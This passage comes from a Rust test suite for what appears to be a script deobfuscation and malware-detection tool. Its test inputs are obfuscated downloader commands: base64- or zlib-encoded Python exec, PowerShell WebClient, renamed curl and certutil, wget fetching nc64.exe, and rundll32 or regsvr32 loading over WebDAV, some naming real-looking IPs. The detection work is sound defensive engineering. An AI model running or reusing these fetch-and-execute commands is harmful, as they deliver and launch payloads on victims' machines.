    fn python_assigned_b64decode_alias_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded = "import requests;requests.get('https://py.example/assigned-alias-inner')";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "d = base64.b64decode; exec(d('{b64}'))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/assigned-alias-inner"
            )
        });
        assert!(
            has,
            "no structured Download from Python assigned b64 alias source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_dunder_import_assigned_b64decode_alias_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded =
            "import requests;requests.get('https://py.example/dunder-assigned-alias-inner')";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "d = __import__('base64').b64decode; exec(d('{b64}'))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/dunder-assigned-alias-inner"
            )
        });
        assert!(
            has,
            "no structured Download from Python __import__ assigned b64 alias source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_dunder_import_base64_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded = "import requests;requests.get('https://py.example/dunder-import-inner')";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "exec(__import__('base64').b64decode('{b64}'))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/dunder-import-inner"
            )
        });
        assert!(
            has,
            "no structured Download from __import__ Python b64 source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_import_base64_module_alias_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded = "import requests;requests.get('https://py.example/module-alias-inner')";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "import base64 as b; exec(b.b64decode('{b64}'))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/module-alias-inner"
            )
        });
        assert!(
            has,
            "no structured Download from Python base64 module alias source: {:?}",
            env.traits
        );
    }

    #[test]
    fn deob_text_var_substring_assembled_url_is_scanned_after_resolution() {
        let mut env = crate::env::Environment::new(&Config::default());
        env.set("scheme", "https");
        env.set("host", "github.com");
        env.set("path", "owner/repo/raw/main/up.png");
        crate::deob_scan::scan_deob_text(
            r#"powershell -Command "(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', 'C:\Users\Public\up.bat')""#,
            &mut env,
        );
        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::DownloadInDeobText { src, line_hint }
                        if src == "https://github.com/owner/repo/raw/main/up.png"
                            && line_hint == "resolved-deob-var-fragments"
                )
            }),
            "assembled URL not scanned after var-fragment resolution: {:?}",
            env.traits
        );
    }

    #[test]
    fn deob_text_var_substring_assembled_url_uses_unicode_set_bindings() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"@set "方案=https"
@set "主机=github.com"
@set "路径=owner/repo/raw/main/up.png"
powershell -Command "(New-Object Net.WebClient).DownloadFile('%方案:~0,5%://%主机:~0,10%/%路径:~0,26%', 'C:\Users\Public\up.bat')""#,
            &mut env,
        );
        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::DownloadInDeobText { src, line_hint }
                        if src == "https://github.com/owner/repo/raw/main/up.png"
                            && line_hint == "resolved-deob-var-fragments"
                )
            }),
            "assembled URL not scanned from Unicode set bindings: {:?}",
            env.traits
        );
    }

    #[test]
    fn deob_text_var_substring_assembled_url_inside_nested_powershell_quotes() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"@set "方案=https"
@set "主机=github.com"
@set "路径=owner/repo/raw/main/up.png"
start /min powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%方案:~0,5%://%主机:~0,10%/%路径:~0,26%', '%APPDATA%\up.bat');""#,
            &mut env,
        );
        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::DownloadInDeobText { src, line_hint }
                        if src == "https://github.com/owner/repo/raw/main/up.png"
                            && line_hint == "resolved-deob-var-fragments"
                )
            }),
            "assembled URL not scanned inside nested PowerShell quotes: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urlsafe_b64decode_literal_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded = "import requests;requests.get('https://py.example/url-safe-inner')";
        let b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(decoded.as_bytes());
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "exec(base64.urlsafe_b64decode('{b64}'))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/url-safe-inner"
            )
        });
        assert!(
            has,
            "no structured Download from decoded Python urlsafe b64 source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_b64decode_altchars_literal_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded =
            "import urllib.request;urllib.request.urlopen('https://py.example/altchars-inner')";
        let b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(decoded.as_bytes());
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "exec(base64.b64decode('{b64}', altchars=b'-_'))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/altchars-inner"
            )
        });
        assert!(
            has,
            "no structured Download from decoded Python altchars b64 source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_zlib_decompress_b64decode_literal_recurses_into_decoded_source_urls() {
        use base64::Engine;
        use std::io::Write;

        let decoded = "import requests;requests.get('https://py.example/zlib-inner')";
        let mut encoder =
            flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
        encoder
            .write_all(decoded.as_bytes())
            .expect("write zlib payload");
        let compressed = encoder.finish().expect("finish zlib payload");
        let b64 = base64::engine::general_purpose::STANDARD.encode(compressed);
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "exec(zlib.decompress(base64.b64decode('{b64}')))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/zlib-inner"
            )
        });
        assert!(
            has,
            "no structured Download from decoded Python zlib b64 source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_gzip_decompress_b64decode_literal_recurses_into_decoded_source_urls() {
        use base64::Engine;
        use std::io::Write;

        let decoded =
            "import urllib.request;urllib.request.urlopen('https://py.example/gzip-inner')";
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        encoder
            .write_all(decoded.as_bytes())
            .expect("write gzip payload");
        let compressed = encoder.finish().expect("finish gzip payload");
        let b64 = base64::engine::general_purpose::STANDARD.encode(compressed);
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "exec(gzip.decompress(base64.b64decode('{b64}')))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/gzip-inner"
            )
        });
        assert!(
            has,
            "no structured Download from decoded Python gzip b64 source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_keyword_url_calls_in_deob_text_emit_structured_downloads() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import requests,urllib.request; requests.get(url = 'https://py.example/kw'); urllib.request.urlopen(url=\"https://py.example/open\")""#,
            &mut env,
        );
        for expected in ["https://py.example/kw", "https://py.example/open"] {
            assert!(
                env.traits
                    .iter()
                    .any(|t| matches!(t, Trait::Download { src, .. } if src == expected)),
                "no structured Download from Python keyword URL {expected}: {:?}",
                env.traits
            );
            assert!(
                !env.traits
                    .iter()
                    .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == expected)),
                "Python keyword URL double-emitted as generic: {:?}",
                env.traits
            );
        }
    }

    #[test]
    fn typo_webclient_downloadfile_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"powrsel.exe -mand "(New-Ojec -TypeName Sstem.Net.WebCliet).DownloadFle('https://drop.example/payload.zip','a.zip')"
powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.example/stage.zip','b.zip')""#,
            &mut env,
        );
        for expected in [
            "https://drop.example/payload.zip",
            "https://raw.example/stage.zip",
        ] {
            assert!(
                env.traits
                    .iter()
                    .any(|t| matches!(t, Trait::Download { src, cmd, dst: None }
                        if cmd == "powershell-webclient-typo" && src == expected)),
                "missing structured Download for {expected}: {:?}",
                env.traits
            );
            assert!(
                !env.traits
                    .iter()
                    .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == expected)),
                "typo WebClient URL double-emitted as generic: {:?}",
                env.traits
            );
        }
    }

    #[test]
    fn webclient_download_with_type_cast_url_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        let url = "https://typed.example/payload.ps1";
        crate::deob_scan::scan_deob_text(
            &format!(r#"powershell "(New-Object Net.WebClient).DownloadString([Uri] '{url}')""#),
            &mut env,
        );
        assert!(
            env.traits.iter().any(|t| {
                matches!(t, Trait::Download { src, cmd, dst: None }
                    if cmd == "powershell-webclient-typo" && src == url)
            }),
            "typed WebClient URL not promoted: {:?}",
            env.traits
        );
        assert!(
            !env.traits
                .iter()
                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
            "typed WebClient URL double-emitted as generic: {:?}",
            env.traits
        );
    }

    #[test]
    fn echoed_vbs_xmlhttp_variable_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            "echo noncatalog = \"https://echo-vbs.example/payload.txt\"\r\necho Set http = CreateObject(\"MSXML2.XMLHTTP\")\r\necho http.open \"GET\", noncatalog, False\r\necho http.send\r\n",
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://echo-vbs.example/payload.txt"
            )
        });
        assert!(
            has,
            "no structured Download from echoed VBS XMLHTTP: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("echo-vbs.example"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "echoed VBS URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn copied_curl_alias_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        env.traits.push(Trait::WindowsUtilManip {
            cmd: "copy c:\\windows\\system32\\curl.exe vjik.exe".to_string(),
            src: "c:\\windows\\system32\\curl.exe".to_string(),
            dst: "vjik.exe".to_string(),
        });
        crate::deob_scan::scan_deob_text(
            "vjik -H \"User-Agent: curl\" -o Autoit3.exe http://curl-copy.example:2351\r\nvjik -o rugaiq.au3 http://curl-copy.example:2351/msi\r\n",
            &mut env,
        );
        for (url, dst) in [
            ("http://curl-copy.example:2351", "Autoit3.exe"),
            ("http://curl-copy.example:2351/msi", "rugaiq.au3"),
        ] {
            let has = env.traits.iter().any(|t| {
                matches!(t,
                    Trait::Download { src, dst: got_dst, .. }
                        if src == url && got_dst.as_deref() == Some(dst)
                )
            });
            assert!(
                has,
                "no structured Download from copied curl alias for {url}: {:?}",
                env.traits
            );
        }
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("curl-copy.example"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "copied curl URLs double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn copied_curl_alias_liberal_url_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        env.traits.push(Trait::WindowsUtilManip {
            cmd: "copy c:\\windows\\system32\\curl.exe vjik.exe".to_string(),
            src: "c:\\windows\\system32\\curl.exe".to_string(),
            dst: "vjik.exe".to_string(),
        });
        crate::deob_scan::scan_deob_text(
            r#"vjik -o Autoit3.exe "hTtPs:\\curl-copy-liberal.example\stage.bin""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://curl-copy-liberal.example/stage.bin"
                        && dst.as_deref() == Some("Autoit3.exe")
            )
        });
        assert!(
            has,
            "no structured Download from copied curl alias liberal URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn curl_style_compact_flags_exe_in_deob_text_emits_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#""C:\Tools\rdl.exe" -LJOk https://cdn.example/files/steam.exe"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://cdn.example/files/steam.exe"
                        && dst.as_deref() == Some("steam.exe")
            )
        });
        assert!(
            has,
            "no structured Download from curl-style compact flags: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("cdn.example"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "curl-style compact flag URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn curl_style_compact_flags_liberal_url_emits_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#""C:\Tools\rdl.exe" -LJOk hTtPs:\\cdn-liberal.example\files\steam.exe"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://cdn-liberal.example/files/steam.exe"
                        && dst.as_deref() == Some("steam.exe")
            )
        });
        assert!(
            has,
            "no structured Download from liberal curl-style compact flags: {:?}",
            env.traits
        );
    }

    #[test]
    fn curl_style_glued_flags_and_url_in_deob_text_emits_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            "curl-s--ssl-no-revoke--failhttp://45.159.248.107/kroko/path/--outputpmfqozvy.tqm",
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. }
                    if src == "http://45.159.248.107/kroko/path/"
            )
        });
        assert!(
            has,
            "no structured Download from glued curl flags/url: {:?}",
            env.traits
        );
    }

    #[test]
    fn echoed_curl_command_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"(echo if not exist "C:\Temp\doc.jpg" ( curl -k "https://echo-curl.example/tempy.7z" -o "C:\ProgramData\tempy.7z" )"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://echo-curl.example/tempy.7z"
                        && dst.as_deref() == Some("C:\\ProgramData\\tempy.7z")
            )
        });
        assert!(
            has,
            "no structured Download from echoed curl command: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("echo-curl.example"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "echoed curl URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn curl_command_liberal_url_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"curl -k "hTtPs:\\echo-curl-liberal.example\tempy.7z" -o "C:\ProgramData\tempy.7z""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://echo-curl-liberal.example/tempy.7z"
                        && dst.as_deref() == Some("C:\\ProgramData\\tempy.7z")
            )
        });
        assert!(
            has,
            "no structured Download from liberal curl command: {:?}",
            env.traits
        );
    }

    #[test]
    fn curl_output_equals_in_deob_text_emits_clean_destination() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"curl --output=C:\Temp\payload.bin https://curl-output.example/payload.bin"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://curl-output.example/payload.bin"
                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
            )
        });
        assert!(
            has,
            "curl --output= destination not recovered cleanly: {:?}",
            env.traits
        );
    }

    #[test]
    fn curl_short_o_glued_in_deob_text_emits_clean_destination() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"curl -oC:\Temp\payload.bin https://curl-short-o.example/payload.bin"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://curl-short-o.example/payload.bin"
                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
            )
        });
        assert!(
            has,
            "curl -oDEST destination not recovered: {:?}",
            env.traits
        );
    }

    #[test]
    fn curl_redirect_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"for /L %%i in (0) do ((curl -s http://curl-redirect.example/payload -H Authorization: x > C:\Temp\payload.bat"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://curl-redirect.example/payload"
                        && dst.as_deref() == Some("C:\\Temp\\payload.bat")
            )
        });
        assert!(
            has,
            "no structured Download from curl redirect: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("curl-redirect.example"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "curl redirect URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn control_flow_curl_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"if not exist "C:\Temp\document.jpg" ( curl -k "https://control-curl.example/tempy.7z" -o "C:\ProgramData\tempy.7z" )"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://control-curl.example/tempy.7z"
                        && dst.as_deref() == Some("C:\\ProgramData\\tempy.7z")
            )
        });
        assert!(
            has,
            "no structured Download from control-flow curl: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("control-curl.example"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "control-flow curl URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn for_f_curl_in_deob_text_trims_command_substitution_suffix() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"for /f "tokens=* delims=" %%i in ('curl -s https://api.example.org') do set "publicIP=%%i""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://api.example.org" && dst.is_none()
            )
        });
        assert!(
            has,
            "no clean structured Download from for/f curl: {:?}",
            env.traits
        );
        let bad = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. }
                | Trait::DownloadInDeobText { src, .. }
                    if src.contains(" do set")
            )
        });
        assert!(!bad, "curl URL kept command suffix: {:?}", env.traits);
    }

    #[test]
    fn quoted_full_path_curl_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"powershell -command "c:\windows\system32\curl.exe" https://fullpath-curl.example/check.php?pcn=host:user:"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://fullpath-curl.example/check.php?pcn=host:user"
                        && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from quoted full-path curl: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("fullpath-curl.example"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "full-path curl URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn echoed_full_path_curl_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"echo powershell -command "c:\windows\system32\curl.exe" https://fullpath-curl.example/z.rar -o c:\users\public\z.rar >> "%TEMP%\curl.bat""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://fullpath-curl.example/z.rar"
                        && dst.as_deref() == Some("c:\\users\\public\\z.rar")
            )
        });
        assert!(
            has,
            "no structured Download from echoed full-path curl: {:?}",
            env.traits
        );
    }

    #[test]
    fn wget_output_flag_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"wget --no-check-certificate http://%%B/win/nc64.exe -O C:\WINDOWS\nc64.exe"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://%%B/win/nc64.exe"
                        && dst.as_deref() == Some("C:\\WINDOWS\\nc64.exe")
            )
        });
        assert!(has, "no structured Download from wget -O: {:?}", env.traits);
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("/win/nc64.exe"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "wget URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn wget_liberal_url_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"wget --no-check-certificate hTtP:\\wget-liberal.example\win\nc64.exe -O C:\WINDOWS\nc64.exe"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://wget-liberal.example/win/nc64.exe"
                        && dst.as_deref() == Some("C:\\WINDOWS\\nc64.exe")
            )
        });
        assert!(has, "no structured liberal wget Download: {:?}", env.traits);
    }

    #[test]
    fn wget_short_o_glued_in_deob_text_emits_clean_destination() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"wget https://wget-output.example/payload.bin -OC:\Temp\payload.bin"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://wget-output.example/payload.bin"
                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
            )
        });
        assert!(
            has,
            "wget -ODEST destination not recovered: {:?}",
            env.traits
        );
    }

    #[test]
    fn wget_long_output_document_spaced_in_deob_text_emits_clean_destination() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"wget --no-check-certificate --output-document C:\Temp\stage.bin https://wget-output-document.example/stage.bin"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://wget-output-document.example/stage.bin"
                        && dst.as_deref() == Some("C:\\Temp\\stage.bin")
            )
        });
        assert!(
            has,
            "wget --output-document DEST destination not recovered: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("wget-output-document.example"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "wget --output-document URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn url_variable_liberal_url_in_deob_text_emits_normalized_variable_trait() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"set "u=hTtPs:\\var-liberal.example\stage.ps1"
$v = 'fTp:\\var-liberal.example\stage.dat'"#,
            &mut env,
        );
        for expected in [
            ("u", "https://var-liberal.example/stage.ps1"),
            ("v", "ftp://var-liberal.example/stage.dat"),
        ] {
            assert!(
                env.traits.iter().any(|t| {
                    matches!(t,
                        Trait::UrlVariable { name, url, .. }
                            if name == expected.0 && url == expected.1)
                }),
                "missing liberal UrlVariable {expected:?}: {:?}",
                env.traits
            );
        }
    }

    #[test]
    fn file_url_preserves_local_absolute_form() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(r#"start file:///C:/Windows/System32/calc.exe"#, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::UrlLaunch { url: src, .. } | Trait::DownloadInDeobText { src, .. }
                    if src == "file:///C:/Windows/System32/calc.exe"
            )
        });
        assert!(has, "file:/// URL was not preserved: {:?}", env.traits);
    }

    #[test]
    fn get_exe_wget_style_input_list_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"C:\ProgramData\WindowsComSvc\Get.exe -nc -i http://47.76.149.26/17/url2.txt -P C:\ProgramData\WindowsComSvc"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://47.76.149.26/17/url2.txt"
                        && dst.as_deref() == Some("C:\\ProgramData\\WindowsComSvc")
            )
        });
        assert!(
            has,
            "no structured Download from Get.exe -i/-P: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("/17/url2.txt"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Get.exe URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn renamed_certutil_urlcache_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"C:\Temp\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/curl.exe C:\Temp\curl.exe"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::CertutilDownload { url, dst }
                    if url == "https://github.com/inwestallis/first_repository/raw/master/curl.exe"
                        && dst == "C:\\Temp\\curl.exe"
            )
        });
        assert!(
            has,
            "no structured CertutilDownload from renamed urlcache: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("first_repository/raw/master/curl.exe"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "renamed certutil URL double-emitted: {:?}",
            env.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod unc_webdav_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn unc_webdav_ip_port_extracted() {
        let script = br#"start powershell.exe -windowstyle hidden net use \\45.9.74.36@8888\davwwwroot\ rundll32 \\45.9.74.36@8888\davwwwroot\2731.dll entry"#;
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::UncWebDavC2 { host, port, .. }
                if host == "45.9.74.36" && port == "8888"
            )
        });
        assert!(has, "no UncWebDavC2: {:?}", report.traits);
    }

    #[test]
    fn unc_webdav_hostname_ssl() {
        let script = br#"regsvr32 /s \\travel-sagem-distant-potential.trycloudflare.com@SSL\DavWWWRoot\loader.sct"#;
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::UncWebDavC2 { host, port, .. }
                if host.contains("trycloudflare") && port == "SSL"
            )
        });
        assert!(has, "no UncWebDavC2 hostname: {:?}", report.traits);
    }

    #[test]
    fn unc_webdav_deduped_per_command() {
        // Same UNC server referenced twice in one line — emit only one trait per (host, port)
        let script = br#"net use \\45.9.74.36@8888\davwwwroot\ & rundll32 \\45.9.74.36@8888\davwwwroot\x.dll"#;
        let report = analyze(script, &Config::default());
        let count = report
            .traits
            .iter()
            .filter(|t| {
                matches!(t,
                    Trait::UncWebDavC2 { host, .. } if host == "45.9.74.36"
                )
            })
            .count();
        assert_eq!(count, 1, "expected 1 deduped trait, got {}", count);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod inline_b64_url_tests {
    use crate::env::{Config, Environment};
    use crate::traits::Trait;
    use crate::{analyze, Config as AnalyzeConfig};
    use base64::Engine;

    #[test]
    fn inline_b64_url_in_deob_text_decoded() {
        // The deob text contains a FromBase64String('<url-as-b64>') literal.
        // The decoder should pick this up and emit a DownloadInDeobText.
        let url = "https://gofile.io/dl/abc123";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let script = format!(
            "set X=$z=[Convert]::FromBase64String('{}')\r\necho %X%\r\n",
            b64
        );
        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
